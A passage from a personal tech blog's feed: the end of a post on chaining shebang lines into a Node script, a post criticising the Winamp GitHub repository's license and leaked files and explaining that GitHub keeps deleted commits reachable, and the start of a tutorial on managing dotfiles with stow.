d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">thatawfulsound.bangbang</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token shebang important">#! /usr/bin/env -S ./bangbang.js "I\_was\_five,\_and\_he\_was\_six" </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> +x mybabyshotmedown.bangbang thatawfulsound.bangbang bangbang.js</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./mybabyshotmedown.bangbang</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">'/home/kblagoev/.nvm/versions/node/v18.14.0/bin/node'</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">'/home/kblagoev/code/scripts/bangbang.js'</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">'I was five, and he was six'</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">'./thatawfulsound.bangbang'</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">'We rode on horses made of sticks'</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">'./mybabyshotmedown.bangbang'</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">'He wore black and I wore white'</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">'He would always win the fight'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>As you can see, we kept the arguments we passed through the shebang lines down until the last call of the Node script. And additionally, we get the "interpreters" called from the shebang line as arguments as well. Pretty neat.</p>
<p>Anyway, I hope you've had fun with this, and maybe you can actually apply it somewhere - who knows. Have fun!</p>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Coding" term="Coding"/>
        <category label="Scripting" term="Scripting"/>
        <category label="Programming" term="Programming"/>
        <category label="Linux" term="Linux"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[The Winamp GitHub repository is seriously mismanaged. And there's nothing they can do about it now.]]></title>
        <id>https://kblagoev.com/blog/winamp-github-repository-problems</id>
        <link href="https://kblagoev.com/blog/winamp-github-repository-problems"/>
        <updated>2024-10-08T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[The Winamp GitHub repository is seriously mismanaged. And there's nothing they can do about it now.]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="preamble">Preamble<a href="https://kblagoev.com/blog/winamp-github-repository-problems#preamble" class="hash-link" aria-label="Direct link to Preamble" title="Direct link to Preamble">​</a></h2>
<p>At this point, I think it's no secret that Winamp going "open-source" has been a bit of a <a href="https://www.youtube.com/watch?v=NgZPa78InWw&amp;pp=ygUSd2luYW1wIG9wZW4gc291cmNl" target="_blank" rel="noopener noreferrer">shit-show</a>.</p>
<p>The initial outrage on the repository was in response to the apparent lack of understanding of what open-source means on the side of Winamp, as they claim that their license is "<a href="https://www.gnu.org/licenses/copyleft.en.html" target="_blank" rel="noopener noreferrer">copyleft</a>", while allowing for neither redistribution of modified versions, nor contributions to the official project, and initially not even <a href="https://github.com/WinampDesktop/winamp/commit/64a51755c6f5d85039463c8bf7c2a9e98e862586" target="_blank" rel="noopener noreferrer">allowing forking</a>! Someone did <a href="https://github.com/WinampDesktop/winamp/issues/6" target="_blank" rel="noopener noreferrer">point it out</a> to them that they can't ban forking on GitHub, as that constitutes <a href="https://docs.github.com/en/site-policy/github-terms/github-terms-of-service#5-license-grant-to-other-users" target="_blank" rel="noopener noreferrer">a violation of the TOS</a>. So, Winamp updated their license to allow forking, but it still doesn't allow anything else that would constitute "open-source" - redistribution or even outside contributions.</p>
<figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://kblagoev.com/content/images/2024/10/winamp-allowed-forking.jpg" class="kg-image" loading="lazy"><figcaption>A truly historic moment, ladies and gentlemen :)</figcaption></figure>
<p>In objective terms, this license falls in the category of "source-available" rather than open-source, and this <em>is</em> an important distinction to make. I have no problem with Winamp making their source available as a valuable case-study, but they really shouldn't have used the term "copyleft" if that is the intention.</p>
<p>But we're here to discuss more so another glaring issue with the repository, which might actually end up landing a lawsuit at Winamp's doors. And sadly, they can't really do anything about it anymore.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="a-rough-overview-of-github">A rough overview of GitHub<a href="https://kblagoev.com/blog/winamp-github-repository-problems#a-rough-overview-of-github" class="hash-link" aria-label="Direct link to A rough overview of GitHub" title="Direct link to A rough overview of GitHub">​</a></h2>
<p>In its simplest form, GitHub can be described as a web-hosted git server for the public. As a developer interested in open-source, you can create a git repository, write some incredible code that you AND your mum are really proud of, and share it with the world on GitHub, so everyone can appreciate your contribution to the democratisation of programming.</p>
<p>But GitHub is more than simply a place to host your git repository. It is also a collaboration platform, where anyone who feels like they <em>like</em> your code, and would like to change it until they <strong>love</strong> it, can "fork" your repository. Forking is in fact not a more aggressive version of spooning, but simply the act of making a clone of the original repository in your account. This forked repository contains all the history of the original - all the code, and all the commits that came before the fork.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="back-to-the-beauty-that-is-the-winamp-github-repo">Back to the beauty that is the Winamp GitHub repo<a href="https://kblagoev.com/blog/winamp-github-repository-problems#back-to-the-beauty-that-is-the-winamp-github-repo" class="hash-link" aria-label="Direct link to Back to the beauty that is the Winamp GitHub repo" title="Direct link to Back to the beauty that is the Winamp GitHub repo">​</a></h2>
<p>If you were to peruse the code on the Winamp repository in the <a href="https://github.com/WinampDesktop/winamp/tree/20d28e80a5c861a9d5f449ea911ab75b4f37ad0d" target="_blank" rel="noopener noreferrer">first few days</a> after its publishing, you would have noticed some very intriguing things. For example, a <code>BuildTools</code> directory which included things like whole executable files the <code>7zip</code>, <code>git</code>, and other programs just hanging around, designated as "build tools". And although very odd indeed, these things seem more so <em>stupid</em> than harmful.</p>
<p>But there's much more there! Inside the repo there was proprietary code from Dolby, some questionable SDKs which Winamp may or may-not have the right to redistribute, an entire directory containing the commercial version of Qt, some, admittedly expired, credentials, and so on, and so forth.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="winamp-did-take-some-action">Winamp did take some action<a href="https://kblagoev.com/blog/winamp-github-repository-problems#winamp-did-take-some-action" class="hash-link" aria-label="Direct link to Winamp did take some action" title="Direct link to Winamp did take some action">​</a></h3>
<p>There are numerous pull requests <a href="https://github.com/WinampDesktop/winamp/pull/1378" target="_blank" rel="noopener noreferrer">deleting said files</a>, and the maintainers <a href="https://github.com/WinampDesktop/winamp/commit/16911d12a01f82fea5d851f98e9e702d80f881d5" target="_blank" rel="noopener noreferrer">did</a> <a href="https://github.com/WinampDesktop/winamp/commit/e721b2e039742c12c1f9c93b1b779ca3b7fc061e" target="_blank" rel="noopener noreferrer">also</a> <a href="https://github.com/WinampDesktop/winamp/commit/6ff62b6dda0906648b0a5ce891e85231cbbb40d5" target="_blank" rel="noopener noreferrer">remove</a> a lot, if not all the unlicensed code. And they did this... in public. You can clearly see many of the commits that delete stuff right there on the <a href="https://github.com/WinampDesktop/winamp/commits" target="_blank" rel="noopener noreferrer">commits page</a>. Which, you know, is a problem. If you open any of the commits listed there, you can simply look at the code that was deleted. If you simply clone that repository locally, you can move around that history and see it at the times before it was removed. This public deletion without rebasing just does nothing.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="they-deleted-some-of-the-commits">They deleted some of the commits<a href="https://kblagoev.com/blog/winamp-github-repository-problems#they-deleted-some-of-the-commits" class="hash-link" aria-label="Direct link to They deleted some of the commits" title="Direct link to They deleted some of the commits">​</a></h3>
<p>OK well, if you just scroll around the commits history, you will notice that the commits that delete, for example the Dolby code is nowhere to be found. But in the end, that doesn't really do anything either, since you can still just go back in history to <a href="https://github.com/WinampDesktop/winamp/commit/20d28e80a5c861a9d5f449ea911ab75b4f37ad0d" target="_blank" rel="noopener noreferrer">a commit before they deleted it</a>, and just see it there.</p>
<figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://kblagoev.com/content/images/2024/10/look-mum-im-a-criminal-now.jpg" class="kg-image" loading="lazy"><figcaption>Does this count as distribution?</figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ok-what-can-they-do">Ok, what can they do?<a href="https://kblagoev.com/blog/winamp-github-repository-problems#ok-what-can-they-do" class="hash-link" aria-label="Direct link to Ok, what can they do?" title="Direct link to Ok, what can they do?">​</a></h3>
<p>I mean, they could just rebase everything, this would theoretically get rid of the commit history. They'd need to get rid of pull requests as well, since those contain code from certain history positions. And to be honest, at this point I'd just delete the repo from GitHub, clean up the codebase locally, and create the GitHub repo anew.</p>
<p>But really, even that would not be enough anymore.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="a-lesser-known-feature-of-github">A lesser-known "feature" of GitHub<a href="https://kblagoev.com/blog/winamp-github-repository-problems#a-lesser-known-feature-of-github" class="hash-link" aria-label="Direct link to A lesser-known &quot;feature&quot; of GitHub" title="Direct link to A lesser-known &quot;feature&quot; of GitHub">​</a></h2>
<p>Remember how I said that they deleted some of the commits from their history, so you can't simply see what code they removed? Well, even though that commit is gone from the git history, and you wouldn't see it even if you cloned the repository locally... you can still see it on GitHub.</p>
<p>You see, to facilitate collaboration through forking, GitHub introduces something called a "<a href="https://docs.github.com/en/repositories/viewing-activity-and-data-for-your-repository/understanding-connections-between-repositories#viewing-a-repositorys-network" target="_blank" rel="noopener noreferrer">repository network</a>". This network holds information of the "upstream" or parent repository, all of its forks, and all the commits that belong to each fork.</p>
<p>Additionally, GitHub caches commits, so that they can be accessed by other repositories in the repository network. As explained by <a href="https://news.ycombinator.com/item?id=41060102" target="_blank" rel="noopener noreferrer">Github themselves</a>:</p>
<blockquote>
<p>GitHub stores the parent repository along with forks in a "repository network". It is a known behavior that objects from one network member are readable via other network members. Blobs and commits are stored together, while refs are stored separately for each fork. This shared storage model is what allows for pull requests between members of the same network.</p>
</blockquote>
<p>So, not only are the deleted commits potentially visible inside of forks that may have this commit from before it was deleted in the upstream repository. No, they are also just visible in general, as long as you know the commit hash. GitHub simply caches them, and you can just visit the page for that commit, and see all the changes it has made, and the entire code-base at that point in history.</p>
<figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://kblagoev.com/content/images/2024/10/github-deleted-commit.jpg" class="kg-image" loading="lazy"><figcaption>You can still see deleted commits on GitHub</figcaption></figure>
<p>So, even if you rebase your repository, the commits history is still there, cached and awaiting. And all forks that were made before the rebase, you can just peruse those anyway.</p>
<p>Now, to be fair - GitHub has an entire <a href="https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository#about-sensitive-data-exposure" target="_blank" rel="noopener noreferrer">docs section</a> about leaking sensitive data. It does mention that you can contact support, and request the cached commits to be removed, if they deem that sensitive data has been exposed.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="so-what-if-github-clears-the-cache-and-we-delete-the-repo">So, what if GitHub clears the cache, and we delete the repo?<a href="https://kblagoev.com/blog/winamp-github-repository-problems#so-what-if-github-clears-the-cache-and-we-delete-the-repo" class="hash-link" aria-label="Direct link to So, what if GitHub clears the cache, and we delete the repo?" title="Direct link to So, what if GitHub clears the cache, and we delete the repo?">​</a></h3>
<p>Well, nothing. It has been already forked more than 2600 thousand times as of the time I'm writing this. It's out there on GitHub :) A lot of the forks were even made before anything was deleted from the repo. So you don't even have to rely on cached commit hashes. In the same <a href="https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository#about-sensitive-data-exposure" target="_blank" rel="noopener noreferrer">docs page</a> I linked above, GitHub themselves say that yeah - if someone has forked your repo, you're on your own, buddy.</p>
<p>If you remove the upstream repository of a repository network, GitHub simply <a href="https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/what-happens-to-forks-when-a-repository-is-deleted-or-changes-visibility#deleting-a-public-repository" target="_blank" rel="noopener noreferrer">designates another fork</a> to be the upstream one. And all of that history and cached commits are still accessible through any of the forked repositories.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://kblagoev.com/blog/winamp-github-repository-problems#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">​</a></h2>
<p>I do find it ironic, that this same collaborative feature which Winamp tried to disallow us from using - forking their repo, is also the one which in the end will not allow them to ever escape the reality that they managed to leak some confidential data on their repository.</p>
<p>But hey, what's done is done, and it did allow me to learn more about how GitHub works with its repository networks and whatnot, so I guess it is possible to learn from someone else's mistakes. I hope you learned something from this too, at the very least to be very careful with what you push to GitHub. And if you do make a mistake - just delete the repo before it was forked, and try again. QED</p>
<p>In terms of the Winamp repository, I am happy that they decided to share their codebase. Even though you literally can't do anything with it apart from reading it, it's still a nice case-study. And I do not wish for them to regret going source-available, so I hope they don't get any legal problems.</p>
<p>But on the other hand, I do wish they'd gone fully open-source. I mean, what are they protecting right now? Winamp is a big part of history, everyone has at least heard of it, if not used it. But nowadays it's just that - part of history. But we've seen that through collaboration and openness of the developers, a lot of software can live for a very long time. Winamp could become something modern and fully maintained, if it allowed for outside contribution. I do hope they take that next step at some point. After they clean up this mess of a repo...</p>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[How I manage configuration files on my Linux machine using dotfiles and stow]]></title>
        <id>https://kblagoev.com/blog/using-stow-for-managing dotfiles</id>
        <link href="https://kblagoev.com/blog/using-stow-for-managing dotfiles"/>
        <updated>2024-10-06T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Maintaining your dotfiles can be actually really simple, once you set it up in a good way. After a few attempts, I landed on stow, and I ain't going back!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="motivation">Motivation<a href="https://kblagoev.com/blog/using-stow-for-managing%20dotfiles#motivation" class="hash-link" aria-label="Direct link to Motivation" title="Direct link to Motivation">​</a></h2>
<p>I've been trying to maintain a <em>dotfiles</em> repository for a few years now. There, I keep configurations for all kinds of different tools and applications I keep on my development machines. It's great for maintainability and versioning, but maintaining and keeping the <em>dotfiles</em> up to date can be a tedious task. But I've quite accidentally found a good and easy way to do it!</p>
<p>The three major options I've considered are:</p>
<ul>
<li>Setting up a home directory as a <code>--bare</code> git repository.</li>
<li><a href="https://en.wikipedia.org/wiki/Symbolic_link" target="_blank" rel="noopener noreferrer">Symlinking</a> every configuration manually</li>
<li><a href="https://linux.die.net/man/8/stow" target="_blank" rel="noopener noreferrer"><em>Stow</em></a></li>
</ul>
<p>The first option of the runt, is of course - from a storytelling point, the first one to discard.</p>
<p>Setting up your entire home directory as a repository, you have to be careful with exactly what to track, and what not. Basically, you'd need a <code>.gitignore</code> file that you'd have to constantly update with everything <em>but</em> the things you want to keep track of. It's very prone to accidentally adding something you don't want tracked, and forgetting to include it in the <code>.gitignore</code>. Plus, a giant git repo in my home directory isn't really to my taste.</p>
<p>Manual symlinking does solve those problems, but it can be quite complicated to automate and keep track of. <em>Stow</em> is an abstraction on top of symlinks, that allows us to automate symlink management, and turn it into <em>package management</em>. Let's see how to set up your <em>dotfiles</em> repo, in order to make use of <em>stow</em>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="setup">Setup<a href="https://kblagoev.com/blog/using-stow-for-managing%20dotfiles#setup" class="hash-link" aria-label="Direct link to Setup" title="Direct link to Setup">​</a></h2>
<p>Before using <em>stow</em>, my config files were laid out in a very simple way. Basically, everything that was in the <code>$HOME/.config/</code> directory, was just copied into <code>$HOME/code/dotfiles/.config/</code>. Other configs that were just files or directories inside the <code>$HOME</code> directory, I just copied into the repo root <code>$HOME/code/dotfiles/</code> - for example from <code>$HOME/.bashrc</code> to <code>$HOME/code/dotfiles/.bashrc</code>.</p>
<div class="language-code codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">~/code/dotfiles</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-code codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- .bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- .config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |-- gtk-3.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |-- i3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |-- nvim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   |-- after</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   |   |-- ftplugin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   |   |   `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   |   `-- plugin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   |       `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   |-- init.lua</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   |-- lua</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   |   `-- kiroki</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   |       `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |   `-- plugin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   |       `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   `-- terminator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|       `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- i3blocks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`-- .local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    `-- share</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        `-- fonts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            `-- [... files]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="how-stow-likes-it">How <em>stow</em> likes it<a href="https://kblagoev.com/blog/using-stow-for-managing%20dotfiles#how-stow-likes-it" class="hash-link" aria-label="Direct link to how-stow-likes-it" title="Direct link to how-stow-likes-it">​</a></h3>
<p><em>Stow</em> works more like (or exactly like) a package manager. We have to think of each configuration we manage as a package. So, instead of having a bunch of configurations under the <code>.config</code> directory, like <code>$HOME/code/dotfiles/.config/i3</code> and <code>$HOME/code/dotfiles/.config/nvim</code>, we can split these into separate directories, in this example <code>$HOME/code/dotfiles/i3/.config/i3</code> and <code>$HOME/code/dotfiles/nvim/.config/nvim</code>.</p>
<p>We can name them however though, so it could be <code>$HOME/code/dotfiles/foo/.config/i3</code> for our i3 config.</p>
<p>And technically, if we want to be not-so-clever, we can just do something like <code>$HOME/code/dotfiles/my-dot-config-directory/.config/&lt;everything like i3 and nvim&gt;</code>. But the power of <em>stow</em> is that we can stow and unstow each config like a package. This technically means, that we can also version our configs. For example, we could have one version of i3 for Arch under <code>$HOME/code/dotfiles/i3-arch/.config/i3</code>, and one for Ubuntu under <code>$HOME/code/dotfiles/i3-ubuntu/.config/i3</code>. Because of these reasons, I recommend this package structure.</p>
<p>For another example, the <code>.bashrc</code> file is typically right in the <code>$HOME</code> directory, so we can "package" it simply as <code>$HOME/code/dotfiles/bash/.bashrc</code>. I know, I know - who uses bash anymore... well, I do apparently :)</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><p><em>Stow</em> is technically a <em>package manager</em>. To make full use of it, we can turn <em>every</em> configuration we contain in our <em>dotfiles</em> into a package, by placing it in its own directory.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="how-it-is-now">How it is now<a href="https://kblagoev.com/blog/using-stow-for-managing%20dotfiles#how-it-is-now" class="hash-link" aria-label="Direct link to How it is now" title="Direct link to How it is now">​</a></h3>
<p>After we migrate to using <em>stow</em>, our repo structure now looks like this:</p>
<div class="language-code codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">~/code/dotfiles</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-code codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   `-- .bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- fonts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   `-- .local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|       `-- share</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           `-- fonts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|               `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- gtk-3.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   `-- .config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|       `-- gtk-3.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- i3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   `-- .config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|       `-- i3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- i3blocks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   `-- i3blocks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|       `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- nvim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   `-- .config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|       `-- nvim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |-- after</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   |-- ftplugin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   |   `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   `-- plugin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |       `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |-- init.lua</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |-- lua</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |   `-- kiroki</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           |       `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|           `-- plugin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|               `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-- stow_config.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`-- terminator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    `-- .config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        `-- terminator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            `-- [... files]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="usage">Usage<a href="https://kblagoev.com/blog/using-stow-for-managing%20dotfiles#usage" class="hash-link" aria-label="Direct link to Usage" title="Direct link to Usage">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="stowing">Stowing<a href="https://kblagoev.com/blog/using-stow-for-managing%20dotfiles#stowing" class="hash-link" aria-label="Direct link to Stowing" title="Direct link to Stowing">​</a></h3>
<p>Well, great. So far, we've basically just moved some directories around. So, what now?</p>
<p>Well, now we can just run <em>stow</em> for each of these newly created packages. The way that <em>stow</em> works, is that it takes the directory inside of the "package" directory, and creates a symlink to it in the parent of the current working directory.</p>
<p>So, for example, if we now <em>cd</em> into <code>$HOME/code/dotfiles/</code>, we can run <code>stow i3</code>. What this will do is, it will create a symlink to <code>$HOME/code/dotfiles/i3/.config/i3</code> in <code>$HOME/code/.config/</code>. That will look something like this:</p>
